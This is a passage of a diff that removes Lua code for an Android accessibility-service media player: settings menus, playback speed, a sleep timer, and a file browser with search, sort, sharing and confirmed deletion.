-    builder.setNegativeButton("Back", function() dialog.dismiss() showSettingsMenu() end)
-    
-    Handler(Looper.getMainLooper()).post(Runnable({
-        run = function()
-            dialog = builder.create()
-            dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-            dialog.show()
-        end
-    }))
-end
-
--- Audio Settings Sub-Menu
-showAudioSettingsMenu = function()
-    local displayItems = luajava.newInstance("java.util.ArrayList")
-    local lv = ListView(service)
-    local adapter = ArrayAdapter(service, android.R.layout.simple_list_item_1, displayItems)
-    lv.setAdapter(adapter)
-
-    local function updateItems()
-        displayItems.clear()
-        local currentSec = math.floor(ffRwDuration / 1000)
-        displayItems.add("Fast Forward and Rewind Changing Time: " .. currentSec .. " Seconds")
-        displayItems.add("Background Playback: " .. backgroundPlay:upper())
-        displayItems.add("Auto Play Next File: " .. autoPlay:upper())
-        displayItems.add("Playback Speed: " .. currentPlaybackSpeed .. "x")
-        displayItems.add("Set Sleep Timer Duration")
-        displayItems.add("Show Volume Boost on Player: " .. showVolumeBoostToggle:upper())
-        displayItems.add("Show Sleep Timer on Player: " .. showSleepTimerToggle:upper())
-        adapter.notifyDataSetChanged()
-    end
-    updateItems()
-
-    local builder = AlertDialog.Builder(service)
-    builder.setTitle("Audio Settings")
-    builder.setView(lv)
-    
-    local dialog = nil
-    lv.setOnItemClickListener(AdapterView.OnItemClickListener({
-        onItemClick = function(parent, view, position, id)
-            if position == 0 then
-                dialog.dismiss()
-                local durItems = {}
-                local actionDurations = {}
-                for _, dur in ipairs(_G.ffRwOptions) do
-                    table.insert(durItems, math.floor(dur / 1000) .. " Seconds")
-                    table.insert(actionDurations, dur)
-                end
-                table.insert(durItems, "Add Custom Duration...")
-                
-                local lvDur = ListView(service)
-                local adapterDur = ArrayAdapter(service, android.R.layout.simple_list_item_1, durItems)
-                lvDur.setAdapter(adapterDur)
-                
-                local durBuilder = AlertDialog.Builder(service)
-                durBuilder.setTitle("Select FF/RW Duration (Long Press to Delete)")
-                durBuilder.setView(lvDur)
-                local durDialog = nil
-                
-                lvDur.setOnItemClickListener(AdapterView.OnItemClickListener({
-                    onItemClick = function(p, v, pos, i)
-                        local idx = pos + 1
-                        if idx == #durItems then
-                            durDialog.dismiss()
-                            Handler(Looper.getMainLooper()).post(Runnable({
-                                run = function()
-                                    local inputField = EditText(service)
-                                    inputField.setHint("Enter seconds (e.g., 25)")
-                                    inputField.setInputType(InputType.TYPE_CLASS_NUMBER)
-                                    
-                                    local customDurBuilder = AlertDialog.Builder(service)
-                                    customDurBuilder.setTitle("Enter Custom Duration")
-                                    customDurBuilder.setView(inputField)
-                                    customDurBuilder.setPositiveButton("Add", function()
-                                        local val = tonumber(tostring(inputField.getText()))
-                                        if val and val > 0 then
-                                            table.insert(_G.ffRwOptions, val * 1000)
-                                            ffRwDuration = val * 1000
-                                            saveState()
-                                            showToast("Duration added and selected: " .. val .. " seconds")
-                                        else
-                                            showToast("Invalid duration")
-                                        end
-                                        showAudioSettingsMenu()
-                                    end)
-                                    customDurBuilder.setNegativeButton("Cancel", function() showAudioSettingsMenu() end)
-                                    showDialogSafe(customDurBuilder, function() showAudioSettingsMenu() end)
-                                end
-                            }))
-                        else
-                            ffRwDuration = actionDurations[idx]
-                            saveState()
-                            showToast("Duration updated to " .. math.floor(ffRwDuration / 1000) .. " seconds")
-                            durDialog.dismiss()
-                            showAudioSettingsMenu()
-                        end
-                    end
-                }))
-                
-                lvDur.setOnItemLongClickListener(AdapterView.OnItemLongClickListener({
-                    onItemLongClick = function(p, v, pos, i)
-                        local idx = pos + 1
-                        if idx < #durItems then
-                            local targetDel = actionDurations[idx]
-                            durDialog.dismiss()
-                            local confDel = AlertDialog.Builder(service)
-                            confDel.setTitle("Delete Duration?")
-                            confDel.setMessage("Are you sure you want to delete " .. math.floor(targetDel / 1000) .. " seconds from list?")
-                            confDel.setPositiveButton("Delete", function()
-                                table.remove(_G.ffRwOptions, idx)
-                                showToast("Duration deleted.")
-                                showAudioSettingsMenu()
-                            end)
-                            confDel.setNegativeButton("Cancel", function() showAudioSettingsMenu() end)
-                            showDialogSafe(confDel, function() showAudioSettingsMenu() end)
-                        end
-                        return true
-                    end
-                }))
-                
-                Handler(Looper.getMainLooper()).post(Runnable({
-                    run = function()
-                        durDialog = durBuilder.create()
-                        durDialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-                        durDialog.show()
-                    end
-                }))
-                
-            elseif position == 1 then
-                backgroundPlay = (backgroundPlay == "on") and "off" or "on"
-                if backgroundPlay == "off" then cancelNotification() end
-                saveState()
-                showToast("Background playback " .. backgroundPlay)
-                updateItems()
-                pcall(function() lv.setSelection(position) end)
-            elseif position == 2 then
-                autoPlay = (autoPlay == "on") and "off" or "on"
-                saveState()
-                showToast("Auto Play " .. autoPlay)
-                updateItems()
-                pcall(function() lv.setSelection(position) end)
-            elseif position == 3 then
-                dialog.dismiss()
-                showPlaybackSpeedMenu("settings")
-            elseif position == 4 then
-                dialog.dismiss()
-                showSleepTimerDialog()
-            elseif position == 5 then
-                showVolumeBoostToggle = (showVolumeBoostToggle == "on") and "off" or "on"
-                saveState()
-                showToast("Volume Boost: " .. showVolumeBoostToggle:upper())
-                updateItems()
-                pcall(function() lv.setSelection(position) end)
-            elseif position == 6 then
-                showSleepTimerToggle = (showSleepTimerToggle == "on") and "off" or "on"
-                saveState()
-                showToast("Sleep Timer: " .. showSleepTimerToggle:upper())
-                updateItems()
-                pcall(function() lv.setSelection(position) end)
-            end
-        end
-    }))
-    builder.setNegativeButton("Back", function() dialog.dismiss() showSettingsMenu() end)
-    
-    Handler(Looper.getMainLooper()).post(Runnable({
-        run = function()
-            dialog = builder.create()
-            dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-            dialog.show()
-        end
-    }))
-end
-
--- Playback Speed Menu
-showPlaybackSpeedMenu = function(parentMenu)
-    local availableSpeeds = {0.5, 0.8, 1.0, 1.25, 1.5, 1.75, 2.0, 2.5, 2.75, 3.0, 3.5, 3.75, 4.0}
-    local displayItems = luajava.newInstance("java.util.ArrayList")
-    local lv = ListView(service)
-    local adapter = ArrayAdapter(service, android.R.layout.simple_list_item_1, displayItems)
-    lv.setAdapter(adapter)
-
-    local activeIdx = 0
-    for i, v in ipairs(availableSpeeds) do
-        if math.abs(currentPlaybackSpeed - v) < 0.01 then
-            displayItems.add(string.format("%.2fx (Active)", v))
-            activeIdx = i - 1
-        else
-            displayItems.add(string.format("%.2fx", v))
-        end
-    end
-    
-    local speedBuilder = AlertDialog.Builder(service)
-    speedBuilder.setTitle("Playback Speed")
-    speedBuilder.setView(lv)
-    
-    local dialog = nil
-    lv.setOnItemClickListener(AdapterView.OnItemClickListener({
-        onItemClick = function(parent, view, position, id)
-            currentPlaybackSpeed = availableSpeeds[position + 1]
-            applyPlaybackSpeed()
-            saveState()
-            showToast("Playback speed changed: " .. currentPlaybackSpeed .. "x")
-            dialog.dismiss()
-            if parentMenu == "settings" then showAudioSettingsMenu() else showMoreOptions() end
-        end
-    }))
-
-    local backFunc = function()
-        dialog.dismiss()
-        if parentMenu == "settings" then showAudioSettingsMenu() else showMoreOptions() end
-    end
-    speedBuilder.setNegativeButton("Back", backFunc)
-    
-    Handler(Looper.getMainLooper()).post(Runnable({
-        run = function()
-            dialog = speedBuilder.create()
-            dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-            import "android.view.KeyEvent"
-            dialog.setOnKeyListener(DialogInterface.OnKeyListener({
-                onKey = function(d, keyCode, event)
-                    if keyCode == KeyEvent.KEYCODE_BACK and event.getAction() == KeyEvent.ACTION_UP then
-                        backFunc()
-                        return true
-                    end
-                    return false
-                end
-            }))
-            dialog.show()
-            pcall(function() lv.setSelection(activeIdx) end)
-        end
-    }))
-end
-
--- Sleep Timer Dialog
-showSleepTimerDialog = function()
-    Handler(Looper.getMainLooper()).post(Runnable({
-        run = function()
-            local context = service
-            local layout = LinearLayout(context)
-            layout.setOrientation(LinearLayout.VERTICAL)
-            layout.setPadding(50, 40, 50, 40)
-            local txtMsg = TextView(context)
-            txtMsg.setText("Select Your Sleep Mode Time Duration:")
-            txtMsg.setTextSize(16)
-            txtMsg.setPadding(0, 0, 0, 20)
-            layout.addView(txtMsg)
-            local etHours = EditText(context)
-            etHours.setHint("Enter Hours")
-            etHours.setInputType(InputType.TYPE_CLASS_NUMBER)
-            layout.addView(etHours)
-            local etMinutes = EditText(context)
-            etMinutes.setHint("Enter Minutes")
-            etMinutes.setInputType(InputType.TYPE_CLASS_NUMBER)
-            layout.addView(etMinutes)
-            local etSeconds = EditText(context)
-            etSeconds.setHint("Enter Seconds")
-            etSeconds.setInputType(InputType.TYPE_CLASS_NUMBER)
-            layout.addView(etSeconds)
-            local builder = AlertDialog.Builder(context)
-            builder.setTitle("Sleep Timer Manager")
-            builder.setView(layout)
-            builder.setPositiveButton("Set Timer", DialogInterface.OnClickListener({
-                onClick = function(dialog, which)
-                    local h = tonumber(tostring(etHours.getText())) or 0
-                    local m = tonumber(tostring(etMinutes.getText())) or 0
-                    local s = tonumber(tostring(etSeconds.getText())) or 0
-                    local totalMs = ((h * 3600) + (m * 60) + s) * 1000
-                    if totalMs > 0 then
-                        sleepDurationMs = totalMs
-                        sleepModeActive = "on"
-                        saveState()
-                        if btnSleepToggleRef then btnSleepToggleRef.setText("Sleep Mode: ON") end
-                        if sleepRunnable then sleepHandler.removeCallbacks(sleepRunnable) end
-                        sleepRunnable = Runnable({
-                            run = function()
-                                pcall(function()
-                                    if player and player.isPlaying() then player.pause() end
-                                    if player then lastPlayedPosition = player.getCurrentPosition() end
-                                    _G.smart_player_is_prepared = true
-                                    _G.smart_player_minimized = false
-                                    saveState()
-                                    cancelNotification()
-                                    if controlsDialog then controlsDialog.dismiss() controlsDialog = nil end
-                                end)
-                            end
-                        })
-                        sleepHandler.postDelayed(sleepRunnable, sleepDurationMs)
-                        
-                        local timeStr = ""
-                        if h > 0 then timeStr = timeStr .. h .. " hours " end
-                        if m > 0 then timeStr = timeStr .. m .. " minutes " end
-                        if s > 0 then timeStr = timeStr .. s .. " seconds " end
-                        showToast("Sleep timer on for " .. timeStr)
-                        showAudioSettingsMenu()
-                    else
-                        showToast("Invalid time duration entered.")
-                        showAudioSettingsMenu()
-                    end
-                end
-            }))
-            builder.setNegativeButton("Cancel", DialogInterface.OnClickListener({
-                onClick = function(dialog, which)
-                    showAudioSettingsMenu()
-                end
-            }))
-            local dialog = builder.create()
-            dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-            import "android.view.KeyEvent"
-            dialog.setOnKeyListener(DialogInterface.OnKeyListener({
-                onKey = function(d, keyCode, event)
-                    if keyCode == KeyEvent.KEYCODE_BACK and event.getAction() == KeyEvent.ACTION_UP then
-                        dialog.dismiss()
-                        showAudioSettingsMenu()
-                        return true
-                    end
-                    return false
-                end
-            }))
-            dialog.show()
-        end
-    }))
-end
-
--- 3. Storage Selection
-showStorageMenu = function()
-    local items = {"Internal Storage", "SD Card"}
-    local builder = AlertDialog.Builder(service)
-    builder.setTitle("Choose Your Storage")
-    builder.setItems(items, function(dialog, which)
-        local selectedStorage = "/storage/emulated/0"
-        if which == 1 then
-            local sdPath = getExternalSdCardPath()
-            if not sdPath or sdPath == "/storage" or sdPath == "/storage/emulated/0" then
-                showToast("Not inserted SD card")
-                showStorageMenu()
-                return
-            end
-            selectedStorage = sdPath
-        end
-        showMediaTypeMenu(selectedStorage)
-    end)
-    builder.setNegativeButton("Back", function() showMainMenu() end)
-    showDialogSafe(builder, function() showMainMenu() end)
-end
-
--- 4. Media Type Selection
-showMediaTypeMenu = function(storagePath)
-    local items = {"Audio", "Video"}
-    local builder = AlertDialog.Builder(service)
-    builder.setTitle("Choose Your Selection")
-    builder.setItems(items, function(dialog, which)
-        local mediaType = (which == 0) and "audio" or "video"
-        showBrowseModeMenu(storagePath, mediaType)
-    end)
-    builder.setNegativeButton("Back", function() showStorageMenu() end)
-    showDialogSafe(builder, function() showStorageMenu() end)
-end
-
--- 5. Selection Mode Menu
-showBrowseModeMenu = function(storagePath, mediaType)
-    local items = {"All Files", "Browse Folders", "Favorites"}
-    local builder = AlertDialog.Builder(service)
-    builder.setTitle("Select Mode")
-    builder.setItems(items, function(dialog, which)
-        if which == 0 then
-            currentBrowseMode = "all_files"
-        elseif which == 1 then
-            currentBrowseMode = "folders"
-        else
-            currentBrowseMode = "favorites"
-        end
-        currentSearchQuery = ""
-        saveState()
-        renderMediaList(storagePath, mediaType)
-    end)
-    builder.setNegativeButton("Back", function() showMediaTypeMenu(storagePath) end)
-    showDialogSafe(builder, function() showMediaTypeMenu(storagePath) end)
-end
-
--- 6. Unified Media List Engine
-renderMediaList = function(currentPath, mediaType)
-    if currentPath == "/storage" then
-        local autoSd = getExternalSdCardPath()
-        if autoSd and autoSd ~= "/storage" then currentPath = autoSd else currentPath = "/storage/emulated/0" end
-    end
-    if currentPath == "/storage/emulated" then currentPath = "/storage/emulated/0" end
-
-    currentSavedFolder = currentPath
-    currentSavedMediaType = mediaType
-    saveState()
-
-    local rawItems = {}
-
-    if currentBrowseMode == "all_files" then
-        showToast("Scanning files, please wait...")
-        rawItems = getAllRecursiveFiles(currentPath, mediaType)
-    elseif currentBrowseMode == "favorites" then
-        rawItems = {}
-        for path, _ in pairs(favoritesMap) do
-            if path:sub(1, #currentPath) == currentPath then
-                local f = File(path)
-                if f.exists() then
-                    local name = f.getName()
-                    if matchesFormat(name, mediaType) then
-                        local time = 0
-                        pcall(function() time = f.lastModified() end)
-                        table.insert(rawItems, {name = name, path = path, isDir = false, time = time})
-                    end
-                end
-            end
-        end
-    else
-        local file = File(currentPath)
-        local list = nil
-        pcall(function() list = file.listFiles() end)
-        local isStorageRoot = (currentPath == "/storage")
-
-        if list and #list > 0 then
-            for i = 0, #list - 1 do
-                local f = list[i]
-                local name = f.getName()
-                if (mediaType == "statuses" or not name:find("^%.")) and name ~= "emulated" and name ~= "self" and name ~= "sdcard0" and name ~= "0" then
-                    if not (isStorageRoot and name:find("^%w+-%w+$")) then
-                        local isDir = false
-                        pcall(function() isDir = f.isDirectory() end)
-                        local time = 0
-                        pcall(function() time = f.lastModified() end)
-                        if isDir then
-                            if currentPath == "/storage" or hasMedia(f, mediaType, 1) then
-                                table.insert(rawItems, {name = name, path = f.getAbsolutePath(), isDir = true, time = time})
-                            end
-                        else
-                            if matchesFormat(name, mediaType) then
-                                table.insert(rawItems, {name = name, path = f.getAbsolutePath(), isDir = false, time = time})
-                            end
-                        end
-                    end
-                end
-            end
-        else
-            local dirs, files = getMediaStoreDirsAndFiles(currentPath, mediaType)
-            for _, d in ipairs(dirs) do
-                if d.name ~= "emulated" and d.name ~= "self" and d.name ~= "sdcard0" and d.name ~= "0" then
-                    if File(d.path).exists() then
-                        local time = 0
-                        pcall(function() time = File(d.path).lastModified() end)
-                        table.insert(rawItems, {name = d.name, path = d.path, isDir = true, time = time})
-                    end
-                end
-            end
-            for _, f in ipairs(files) do
-                if File(f.path).exists() then
-                    local time = 0
-                    pcall(function() time = File(f.path).lastModified() end)
-                    table.insert(rawItems, {name = f.name, path = f.path, isDir = false, time = time})
-                end
-            end
-        end
-    end
-
-    local filteredList = {}
-    for _, item in ipairs(rawItems) do
-        local keeps = true
-        if currentSearchQuery ~= "" then
-            if not item.name:lower():find(currentSearchQuery:lower(), 1, true) then
-                keeps = false
-            end
-        end
-        if keeps then table.insert(filteredList, item) end
-    end
-
-    if currentSortMethod == "A-Z" then
-        table.sort(filteredList, function(a, b)
-            if a.isDir ~= b.isDir then return a.isDir end
-            return a.name:lower() < b.name:lower()
-        end)
-    elseif currentSortMethod == "Z-A" then
-        table.sort(filteredList, function(a, b)
-            if a.isDir ~= b.isDir then return a.isDir end
-            return a.name:lower() > b.name:lower()
-        end)
-    elseif currentSortMethod == "Newest" then
-        table.sort(filteredList, function(a, b)
-            if a.isDir ~= b.isDir then return a.isDir end
-            return (a.time or 0) > (b.time or 0)
-        end)
-    elseif currentSortMethod == "Oldest" then
-        table.sort(filteredList, function(a, b)
-            if a.isDir ~= b.isDir then return a.isDir end
-            return (a.time or 0) < (b.time or 0)
-        end)
-    end
-
-    if #filteredList == 0 and currentSearchQuery == "" then
-        if currentBrowseMode == "favorites" then
-            showToast("Favorite Button Empty")
-            showBrowseModeMenu(currentPath, mediaType)
-        else
-            showToast("No files found.")
-            if tostring(currentPath):find("WhatsApp") then
-                showWhatsAppMenu()
-            else
-                showMainMenu()
-            end
-        end
-        return
-    end
-
-    local displayItems = luajava.newInstance("java.util.ArrayList")
-    local actionItems = {}
-
-    local lvMedia = ListView(service)
-    local adapterMedia = ArrayAdapter(service, android.R.layout.simple_list_item_1, displayItems)
-    lvMedia.setAdapter(adapterMedia)
-
-    local mainLayout = LinearLayout(service)
-    mainLayout.setOrientation(LinearLayout.VERTICAL)
-    
-    local lvParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0)
-    lvMedia.setLayoutParams(lvParams)
-    mainLayout.addView(lvMedia)
-
-    local bottomBar = nil
-    local btnCancel = nil
-    local btnShare = nil
-    local btnDelete = nil
-    local mediaListDialog = nil
-
-    local function updateListAndButtons()
-        displayItems.clear()
-        actionItems = {}
-
-        local searchString = "Search"
-        if currentSearchQuery ~= "" then searchString = "Search: " .. currentSearchQuery end
-        displayItems.add(searchString)
-        table.insert(actionItems, {type = "control", target = "search"})
-
-        local sortMethodsTranslations = {["A-Z"] = "A-Z", ["Z-A"] = "Z-A", ["Newest"] = "Newest First", ["Oldest"] = "Oldest First"}
-        displayItems.add("Sort By: " .. (sortMethodsTranslations[currentSortMethod] or currentSortMethod))
-        table.insert(actionItems, {type = "control", target = "sort"})
-
-        if currentSearchQuery ~= "" then
-            displayItems.add("Clear Search")
-            table.insert(actionItems, {type = "control", target = "clear_search"})
-        end
-
-        if isMultiSelectActive then
-            displayItems.add("[Select All]")
-            table.insert(actionItems, {type = "multiselect_control", target = "select_all"})
-        end
-
-        for _, item in ipairs(filteredList) do
-            local prefix = ""
-            if isMultiSelectActive then
-                if selectedItemsMap[item.path] then 
-                    prefix = "[Checkbox Checked] " 
-                else 
-                    prefix = "[Checkbox Not Checked] " 
-                end
-            else
-                if not item.isDir then
-                    if mediaType == "video" or (mediaType == "statuses" and item.name:lower():find("%.mp4$")) then
-                        prefix = "📹 "
-                    elseif mediaType == "statuses" then
-                        prefix = "🖼️ "
-                    end
-                end
-            end
-            
-            if item.isDir then
-                displayItems.add(prefix .. "[Folder] " .. item.name)
-                table.insert(actionItems, {type = "media", data = item})
-            else
-                displayItems.add(prefix .. item.name)
-                table.insert(actionItems, {type = "media", data = item})
-            end
-        end
-
-        adapterMedia.notifyDataSetChanged()
-
-        if isMultiSelectActive and btnShare and btnDelete then
-            local selCount, selSizeStr = getSelectedStats(filteredList, selectedItemsMap)
-            btnShare.setText(string.format("Share (%d items, %s)", selCount, selSizeStr))
-            btnDelete.setText(string.format("Delete (%d items, %s)", selCount, selSizeStr))
-            
-            local hasFolderSelected = false
-            for _, item in ipairs(filteredList) do
-                if selectedItemsMap[item.path] and item.isDir then
-                    hasFolderSelected = true
-                    break
-                end
-            end
-            if hasFolderSelected then
-                btnShare.setVisibility(View.GONE)
-            else
-                btnShare.setVisibility(View.VISIBLE)
-            end
-        end
-    end
-
-    bottomBar = LinearLayout(service)
-    bottomBar.setOrientation(LinearLayout.HORIZONTAL)
-    bottomBar.setGravity(Gravity.RIGHT)
-    local barParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
-    bottomBar.setLayoutParams(barParams)
-
-    btnCancel = Button(service)
-    btnCancel.setText("Cancel")
-    btnCancel.setOnClickListener(View.OnClickListener({
-        onClick = function(v)
-            isMultiSelectActive = false
-            selectedItemsMap = {}
-            if bottomBar then bottomBar.setVisibility(View.GONE) end
-            updateListAndButtons()
-        end
-    }))
-
-    btnShare = Button(service)
-    btnShare.setOnClickListener(View.OnClickListener({
-        onClick = function(v)
-            local sharePaths = {}
-            for _, item in ipairs(filteredList) do
-                if not item.isDir and selectedItemsMap[item.path] then
-                    table.insert(sharePaths, item.path)
-                end
-            end
-            if #sharePaths == 0 then
-                showToast("No files selected to share. Folders cannot be shared directly.")
-                return
-            end
-            saveState()
-            mediaListDialog.dismiss()
-            
-            local originalPackage = ""
-            pcall(function()
-                local root = service.getRootInActiveWindow()
-                if root then originalPackage = tostring(root.getPackageName()) end
-            end)
-            if originalPackage == "" or originalPackage == "android" or originalPackage == "com.android.intentresolver" then
-                originalPackage = "com.android.launcher3"
-            end
-            
-            pcall(function()
-                local context = service
-                setStrictModeAllowFileUri()
-                if #sharePaths == 1 then
-                    local file = File(sharePaths[1])
-                    local shareUri = Uri.fromFile(file)
-                    local intent = Intent(Intent.ACTION_SEND)
-                    intent.setType("*/*")
-                    intent.putExtra(Intent.EXTRA_STREAM, shareUri)
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-                    local chooser = Intent.createChooser(intent, "Share File")
-                    chooser.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    context.startActivity(chooser)
-                else
-                    local uris = luajava.newInstance("java.util.ArrayList")
-                    for _, path in ipairs(sharePaths) do
-                        uris.add(Uri.fromFile(File(path)))
-                    end
-                    local intent = Intent(Intent.ACTION_SEND_MULTIPLE)
-                    intent.setType("*/*")
-                    intent.putParcelableArrayListExtra(Intent.EXTRA_STREAM, uris)
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-                    local chooser = Intent.createChooser(intent, "Share Files")
-                    chooser.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    context.startActivity(chooser)
-                end
-            end)
-            
-            local monitorHandler = Handler(Looper.getMainLooper())
-            local monitorRunnable
-            local loopCount = 0
-            local hasLeftApp = false
-            
-            monitorRunnable = Runnable({
-                run = function()
-                    loopCount = loopCount + 1
-                    local currentPkg = ""
-                    pcall(function()
-                        local root = service.getRootInActiveWindow()
-                        if root then currentPkg = tostring(root.getPackageName()) end
-                    end)
-                    local currentPkgLower = currentPkg:lower()
-                    
-                    if currentPkg ~= "" and currentPkg ~= originalPackage and not currentPkgLower:find("launcher") and not currentPkgLower:find("home") then
-                        hasLeftApp = true
-                    end
-                    
-                    if hasLeftApp and (currentPkg == originalPackage or currentPkgLower:find("launcher") or currentPkgLower:find("home")) then
-                        Handler(Looper.getMainLooper()).post(Runnable({
-                            run = function() 
-                                if currentFilePath and currentFilePath ~= "" then
-                                    showPlayerControls()
-                                else
-                                    renderMediaList(currentPath, mediaType)
-                                end
-                            end
-                        }))
-                    elseif not hasLeftApp and loopCount > 10 then
-                        Handler(Looper.getMainLooper()).post(Runnable({
-                            run = function()
-                                if currentFilePath and currentFilePath ~= "" then
-                                    showPlayerControls()
-                                else
-                                    renderMediaList(currentPath, mediaType)
-                                end
-                            end
-                        }))
-                    elseif loopCount < 120 then
-                        monitorHandler.postDelayed(monitorRunnable, 1000)
-                    end
-                end
-            })
-            monitorHandler.postDelayed(monitorRunnable, 1000)
-            
-            isMultiSelectActive = false
-            selectedItemsMap = {}
-        end
-    }))
-
-    btnDelete = Button(service)
-    btnDelete.setOnClickListener(View.OnClickListener({
-        onClick = function(v)
-            local selCount, selSizeStr = getSelectedStats(filteredList, selectedItemsMap)
-            if selCount == 0 then
-                showToast("No items selected.")
-            else
-                local confSelDel = AlertDialog.Builder(service)
-                confSelDel.setTitle("Confirm Deletion")
-                confSelDel.setMessage(string.format("Are you sure you want to permanently delete %d selected items (%s)?", selCount, selSizeStr))
-                confSelDel.setPositiveButton("Delete All", function()
-                    mediaListDialog.dismiss()
-                    showToast("Deleting selected items...")
-                    
-                    Thread(Runnable({
-                        run = function()
-                            local resetPlayer = false
-                            for _, item in ipairs(filteredList) do
-                                if selectedItemsMap[item.path] and currentFilePath == item.path then
-                                    resetPlayer = true
-                                end
-                            end
-                            if resetPlayer then
-                                Handler(Looper.getMainLooper()).post(Runnable({
-                                    run = function() player.reset() cancelNotification() end
-                                }))
-                                _G.smart_player_is_prepared = false
-                                _G.smart_player_current_path = ""
-                                currentFilePath = "" lastPlayedPosition = 0
-                            end
-
-                            local successCount = 0
-                            for _, item in ipairs(filteredList) do
-                                if selectedItemsMap[item.path] then
-                                    local targetFile = File(item.path)
-                                    if item.isDir then
-                                        if deleteFolderRecursive(targetFile) then successCount = successCount + 1 end
-                                    else
-                                        if targetFile.delete() then successCount = successCount + 1 end
-                                    end
-                                end
-                            end
-                            
-                            Handler(Looper.getMainLooper()).post(Runnable({
-                                run = function()
-                                    showToast(successCount .. " items deleted successfully.")
-                                    isMultiSelectActive = false
-                                    selectedItemsMap = {}
-                                    saveState()
-                                    if controlsDialog then controlsDialog.dismiss() controlsDialog = nil end
-                                    renderMediaList(currentPath, mediaType)
-                                end
-                            }))
-                        end
-                    })).start()
-                end)
-                confSelDel.setNegativeButton("Cancel", nil)
-                showDialogSafe(confSelDel, function() end)
-            end
-        end
-    }))
-
-    bottomBar.addView(btnCancel)
-    bottomBar.addView(btnShare)
-    bottomBar.addView(btnDelete)
-    mainLayout.addView(bottomBar)
-
-    if isMultiSelectActive then
-        bottomBar.setVisibility(View.VISIBLE)
-    else
-        bottomBar.setVisibility(View.GONE)
-    end
-
-    updateListAndButtons()
-
-    local builder = AlertDialog.Builder(service)
-    builder.setTitle(currentBrowseMode == "all_files" and "All Files" or (currentBrowseMode == "favorites" and "Favorites" or "Browse Folders"))
-    builder.setView(mainLayout)
-
-    lvMedia.setOnItemClickListener(AdapterView.OnItemClickListener({
-        onItemClick = function(parent, view, position, id)
-            local action = actionItems[position + 1]
-            if not action then return end
-            
-            if action.type == "control" then
-                if action.target == "search" then
-                    mediaListDialog.dismiss()
-                    Handler(Looper.getMainLooper()).post(Runnable({
-                        run = function()
-                            local inputField = EditText(service)
-                            inputField.setHint("Search...")
-                            if currentSearchQuery ~= "" then inputField.setText(currentSearchQuery) end
-                            local searchDialog = AlertDialog.Builder(service)
-                            searchDialog.setTitle("Search")
-                            searchDialog.setView(inputField)
-                            searchDialog.setPositiveButton("Search", function()
-                                currentSearchQuery = tostring(inputField.getText())
-                                renderMediaList(currentPath, mediaType)
-                            end)
-                            searchDialog.setNegativeButton("Cancel", function()
-                                renderMediaList(currentPath, mediaType)
-                            end)
-                            showDialogSafe(searchDialog, function() renderMediaList(currentPath, mediaType) end)
-                        end
-                    }))
-                elseif action.target == "sort" then
-                    mediaListDialog.dismiss()
-                    local sortOptions = {"A-Z", "Z-A", "Newest First", "Oldest First"}
-                    local sortOptionBuilder = AlertDialog.Builder(service)
-                    sortOptionBuilder.setTitle("Sort By")
-                    sortOptionBuilder.setItems(sortOptions, function(d, w)
-                        if w == 0 then currentSortMethod = "A-Z"
-                        elseif w == 1 then currentSortMethod = "Z-A"
-                        elseif w == 2 then currentSortMethod = "Newest"
-                        elseif w == 3 then currentSortMethod = "Oldest" end
-                        saveState()
-                        renderMediaList(currentPath, mediaType)
-                    end)
-                    showDialogSafe(sortOptionBuilder, function() renderMediaList(currentPath, mediaType) end)
-                elseif action.target == "clear_search" then
-                    currentSearchQuery = ""
-                    mediaListDialog.dismiss()
-                    renderMediaList(currentPath, mediaType)
-                end
-            elseif action.type == "multiselect_control" then
-                if action.target == "select_all" then
-                    for _, item in ipairs(filteredList) do
-                        selectedItemsMap[item.path] = true
-                    end
-                    updateListAndButtons()
-                    pcall(function() lvMedia.setSelection(position) end)
-                end
-            elseif action.type == "media" then
-                local selectedMedia = action.data
-                if isMultiSelectActive then
-                    selectedItemsMap[selectedMedia.path] = not selectedItemsMap[selectedMedia.path]
-                    if selectedItemsMap[selectedMedia.path] then
-                        service.speak("Checkbox checked")
-                    else
-                        service.speak("Checkbox unchecked")
-                    end
-                    updateListAndButtons() 
-                    pcall(function() lvMedia.setSelection(position) end)
-                else
-                    if selectedMedia.isDir then
-                        mediaListDialog.dismiss()
-                        renderMediaList(selectedMedia.path, mediaType)
-                    else
-                        if mediaType == "statuses" and not selectedMedia.path:lower():find("%.mp4$") then
-                            openImageExternally(selectedMedia.path)
-                        else
-                            mediaListDialog.dismiss()
-                            currentPlaylist = {}
-                            for _, innerObj in ipairs(filteredList) do
-                                if not innerObj.isDir then
-                                    if mediaType == "statuses" then
-                                        if innerObj.path:lower():find("%.mp4$") then
-                                            table.insert(currentPlaylist, innerObj.path)
-                                            if innerObj.path == selectedMedia.path then currentIndex = #currentPlaylist end
-                                        end
-                                    else
-                                        table.insert(currentPlaylist, innerObj.path)
-                                        if innerObj.path == selectedMedia.path then currentIndex = #currentPlaylist end
-                                    end
-                                end
-                            end
-                            lastPlayedPosition = 0
-                            playMedia(selectedMedia.path, true)
-                        end
-                    end
-                end
-            end
-        end
-    }))
-
-    lvMedia.setOnItemLongClickListener(AdapterView.OnItemLongClickListener({
-        onItemLongClick = function(parent, view, position, id)
-            local action = actionItems[position + 1]
-            if action and action.type == "media" then
-                local targetMedia = action.data
-                if multiSelectSetting == "on" then
-                    if not isMultiSelectActive then
-                        isMultiSelectActive = true
-                        selectedItemsMap = {}
-                        selectedItemsMap[targetMedia.path] = true
-                        showToast("Multi-select mode enabled.")
-                        if bottomBar then bottomBar.setVisibility(View.VISIBLE) end
-                        updateListAndButtons()
-                        pcall(function() lvMedia.setSelection(position) end)
-                    end
-                else
